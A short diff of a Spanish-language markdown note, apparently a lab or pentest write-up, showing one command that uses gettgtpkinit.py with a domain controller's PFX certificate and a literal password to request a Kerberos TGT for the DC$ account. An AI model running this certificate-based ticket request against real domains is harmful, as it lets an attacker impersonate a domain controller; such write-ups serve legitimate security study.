@@ -5,3 +5,4 @@ Esta herramienta nos permite utlizar Tickets Granting Tickets el protocolo PKINI
 ```ruby
 python gettgtpkinit.py -cert-pfx "/root/DC$.pfx" -pfx-pass eK2PeOlwG60EkPS2TNxX ignite.local/dc$ dc$.ccache
 ```
+
